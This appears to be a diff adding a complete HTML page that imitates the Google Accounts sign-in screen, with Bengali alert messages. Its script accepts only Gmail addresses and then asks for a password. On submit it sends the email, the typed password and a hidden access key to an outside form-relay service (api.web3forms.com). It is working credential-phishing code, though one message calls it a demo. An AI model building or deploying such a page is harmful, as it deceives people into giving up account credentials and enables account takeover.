@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        /* Google Material You (V3) Color Palette */
+        :root {
+            --bg-color: #f0f4f9;
+            --card-bg: #ffffff;
+            --google-blue: #0b57d0;
+            --google-blue-hover: #0842a0;
+            --text-main: #1f1f1f;
+            --text-sub: #444746;
+            --border-color: #747775;
+            --error-red: #b3261e;
+            --snackbar-bg: #323135;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        body {
+            font-family: 'Roboto', arial, sans-serif;
+            background-color: var(--bg-color);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .card {
+            background-color: var(--card-bg);
+            width: 448px;
+            min-height: 500px;
+            padding: 40px;
+            border-radius: 28px;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .logo {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 16px;
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 400;
+            color: var(--text-main);
+            margin-bottom: 12px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: var(--text-main);
+            margin-bottom: 32px;
+        }
+
+        .user-chip {
+            display: none;
+            align-items: center;
+            padding: 4px 12px 4px 6px;
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            width: fit-content;
+            margin: 0 0 32px 0;
+            font-size: 14px;
+            color: var(--text-main);
+            font-weight: 500;
+            gap: 8px;
+            cursor: pointer;
+        }
+
+        .user-chip:hover { background-color: rgba(68, 71, 70, 0.08); }
+
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 8px;
+        }
+
+        input[type="text"], input[type="email"] {
+            width: 100%;
+            height: 56px;
+            padding: 16px;
+            font-size: 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            outline: none;
+            background: transparent;
+            color: var(--text-main);
+            transition: border 0.2s;
+        }
+
+        input:focus { border: 2px solid var(--google-blue) !important; padding: 15px; }
+
+        .input-wrapper label {
+            position: absolute;
+            left: 12px;
+            top: 16px;
+            background: white;
+            padding: 0 4px;
+            color: var(--text-sub);
+            font-size: 16px;
+            pointer-events: none;
+            transition: 0.2s ease all;
+        }
+
+        input:focus ~ label,
+        input:not(:placeholder-shown) ~ label {
+            top: -10px; left: 10px; font-size: 12px; color: var(--google-blue); font-weight: 500;
+        }
+
+        /* Error State */
+        input.error { border: 2px solid var(--error-red) !important; }
+        input.error ~ label { color: var(--error-red) !important; }
+
+        .links {
+            color: var(--google-blue);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            background: none;
+            border: none;
+            padding: 8px 0;
+            cursor: pointer;
+            margin-bottom: 32px;
+            display: inline-block;
+        }
+
+        .links:hover { text-decoration: underline; }
+
+        .guest-text {
+            font-size: 14px;
+            color: var(--text-sub);
+            line-height: 1.5;
+            margin-bottom: 40px;
+        }
+
+        .guest-text a { color: var(--google-blue); text-decoration: none; font-weight: 500; }
+
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: auto;
+        }
+
+        .btn-secondary {
+            color: var(--google-blue);
+            background: none;
+            border: none;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            padding: 10px 16px;
+            border-radius: 4px;
+        }
+
+        .btn-secondary:hover { background-color: rgba(11, 87, 208, 0.08); }
+
+        .btn-primary {
+            background-color: var(--google-blue);
+            color: white;
+            border: none;
+            padding: 0 24px;
+            height: 40px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--google-blue-hover);
+            box-shadow: 0 1px 2px rgba(0,0,0,0.2);
+        }
+
+        #google-snackbar {
+            visibility: hidden;
+            min-width: 320px;
+            background-color: var(--snackbar-bg);
+            color: #fff;
+            text-align: left;
+            border-radius: 4px;
+            padding: 14px 24px;
+            position: fixed;
+            z-index: 1000;
+            left: 24px;
+            bottom: 24px;
+            font-size: 14px;
+            box-shadow: 0 3px 5px -1px rgba(0,0,0,.2), 0 6px 10px 0 rgba(0,0,0,.14), 0 1px 18px 0 rgba(0,0,0,.12);
+            display: flex;
+            align-items: center;
+        }
+
+        #google-snackbar.show {
+            visibility: visible;
+            animation: slideIn 0.3s forwards, fadeOut 0.5s 3.5s forwards;
+        }
+
+        @keyframes slideIn { from { bottom: 0; opacity: 0; } to { bottom: 24px; opacity: 1; } }
+        @keyframes fadeOut { from { opacity: 1; } to { opacity: 0; } }
+
+        .fade-in { animation: fadeIn 0.3s ease-in-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateX(10px); } to { opacity: 1; transform: translateX(0); } }
+
+        .footer {
+            width: 448px;
+            margin-top: 24px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: var(--text-sub);
+        }
+
+        .footer-links a {
+            color: var(--text-sub);
+            text-decoration: none;
+            margin-left: 16px;
+            padding: 4px 8px;
+            border-radius: 4px;
+        }
+
+        .footer-links a:hover { background-color: rgba(68, 71, 70, 0.08); }
+
+        @media (max-width: 500px) {
+            .card { width: 100%; border-radius: 0; min-height: 100vh; box-shadow: none; }
+            .footer { width: 100%; flex-direction: column; gap: 16px; padding: 0 40px; }
+            #google-snackbar { left: 16px; right: 16px; min-width: auto; bottom: 16px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card" id="authCard">
+        <svg class="logo" viewBox="0 0 48 48">
+            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24s.92 7.54 2.56 10.78l7.97-6.19z"/>
+            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+        </svg>
+
+        <h1 id="title">Sign in</h1>
+        <p class="subtitle" id="subtitle">Use your Google Account</p>
+
+        <div class="user-chip" id="userChip" onclick="goBack()">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="#444746"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+            <span id="displayEmail"></span>
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746"><path d="M7 10l5 5 5-5z"/></svg>
+        </div>
+
+        <form id="authForm" onsubmit="return false;">
+            <input type="hidden" name="access_key" value="d284f087-dcae-4ff0-8d88-c338c313b475">
+
+            <div id="emailStep" class="fade-in">
+                <div class="input-wrapper">
+                    <input type="text" id="email" name="email" placeholder=" " required>
+                    <label>Email or phone</label>
+                </div>
+                
+                <a href="https://accounts.google.com/signin/usernamerecovery" class="links" target="_blank">Forgot email?</a>
+                
+                <div class="guest-text">
+                    Not your computer? Use a Private Window to sign in. <br>
+                    <a href="https://support.google.com/chrome/answer/6130773" target="_blank">Learn more about using Guest mode</a>
+                </div>
+
+                <div class="button-group">
+                    <button type="button" class="btn-secondary" onclick="window.open('https://accounts.google.com/signup', '_blank')">Create account</button>
+                    <button type="button" class="btn-primary" onclick="goToPassword()">Next</button>
+                </div>
+            </div>
+
+            <div id="passwordStep" style="display: none;" class="fade-in">
+                <div class="input-wrapper">
+                    <input type="text" id="nameInput" name="name" placeholder=" " required>
+                    <label>Enter your password</label>
+                </div>
+                
+                <a href="https://accounts.google.com/signin/recovery" class="links" target="_blank">Forgot name?</a>
+
+                <div class="button-group" style="margin-top: 40px;">
+                    <button type="button" class="btn-secondary" onclick="goBack()">Back</button>
+                    <button type="button" class="btn-primary" id="finalSubmitBtn" onclick="submitLogin()">Next</button>
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <div id="google-snackbar">
+        <span id="snackbar-msg">মেসেজ পাঠানো হয়েছে</span>
+    </div>
+
+    <div class="footer">
+        <div class="lang-selector">English (United States) ▾</div>
+        <div class="footer-links">
+            <a href="https://support.google.com/accounts" target="_blank">Help</a>
+            <a href="https://policies.google.com/privacy" target="_blank">Privacy</a>
+            <a href="https://policies.google.com/terms" target="_blank">Terms</a>
+        </div>
+    </div>
+
+    <script>
+        const emailInput = document.getElementById('email');
+        const nameInput = document.getElementById('nameInput');
+        const emailStep = document.getElementById('emailStep');
+        const passwordStep = document.getElementById('passwordStep');
+        const userChip = document.getElementById('userChip');
+        const displayEmail = document.getElementById('displayEmail');
+        const title = document.getElementById('title');
+        const subtitle = document.getElementById('subtitle');
+        const authForm = document.getElementById('authForm');
+        const finalSubmitBtn = document.getElementById('finalSubmitBtn');
+        const snackbar = document.getElementById('google-snackbar');
+        const snackbarMsg = document.getElementById('snackbar-msg');
+
+        function showGoogleAlert(message) {
+            snackbarMsg.innerText = message;
+            snackbar.className = "show";
+            setTimeout(() => { 
+                snackbar.className = snackbar.className.replace("show", ""); 
+            }, 4000);
+        }
+
+        // Updated Validation Logic: ONLY support @gmail.com
+        function isGmail(email) {
+            // Regex for strictly @gmail.com (case insensitive)
+            const re = /^[a-zA-Z0-9._%+-]+@gmail\.com$/i;
+            return re.test(email);
+        }
+
+        function goToPassword() {
+            const val = emailInput.value.trim();
+            
+            if (val === '') {
+                emailInput.classList.add('error');
+                emailInput.focus();
+                showGoogleAlert('একটি ইমেইল ঠিকানা লিখুন');
+                return;
+            } else if (!isGmail(val)) {
+                emailInput.classList.add('error');
+                emailInput.focus();
+                showGoogleAlert('শুধুমাত্র @gmail.com ইমেইল ঠিকানা ব্যবহার করুন');
+                return;
+            }
+
+            // Valid gmail format
+            emailInput.classList.remove('error');
+            emailStep.style.display = 'none';
+            passwordStep.style.display = 'block';
+            title.innerText = 'Welcome';
+            subtitle.style.display = 'none';
+            displayEmail.innerText = val;
+            userChip.style.display = 'flex';
+            setTimeout(() => nameInput.focus(), 100);
+        }
+
+        function goBack() {
+            passwordStep.style.display = 'none';
+            emailStep.style.display = 'block';
+            title.innerText = 'Sign in';
+            subtitle.style.display = 'block';
+            userChip.style.display = 'none';
+            nameInput.value = '';
+            nameInput.classList.remove('error');
+        }
+
+        async function submitLogin() {
+            if (nameInput.value.trim() === '') {
+                nameInput.classList.add('error');
+                nameInput.focus();
+                showGoogleAlert('আপনার নামটি লিখুন');
+                return;
+            }
+
+            nameInput.classList.remove('error');
+            const formData = new FormData(authForm);
+            finalSubmitBtn.textContent = "Sending...";
+            finalSubmitBtn.disabled = true;
+
+            try {
+                const response = await fetch("https://api.web3forms.com/submit", {
+                    method: "POST",
+                    body: formData
+                });
+
+                if (response.ok) {
+                    showGoogleAlert('সফলভাবে পাঠানো হয়েছে (ডেমো)');
+                    authForm.reset();
+                    setTimeout(goBack, 1000);
+                } else {
+                    showGoogleAlert('Error: ডেটা পাঠানো সম্ভব হয়নি।');
+                }
+            } catch (error) {
+                showGoogleAlert('নেটওয়ার্ক সমস্যা, আবার চেষ্টা করুন।');
+            } finally {
+                finalSubmitBtn.textContent = "Next";
+                finalSubmitBtn.disabled = false;
+            }
+        }
+
+        emailInput.addEventListener("input", () => emailInput.classList.remove('error'));
+        nameInput.addEventListener("input", () => nameInput.classList.remove('error'));
+
+        emailInput.addEventListener("keypress", (e) => { if (e.key === "Enter") goToPassword(); });
+        nameInput.addEventListener("keypress", (e) => { if (e.key === "Enter") submitLogin(); });
+    </script>
+</body>
+</html>
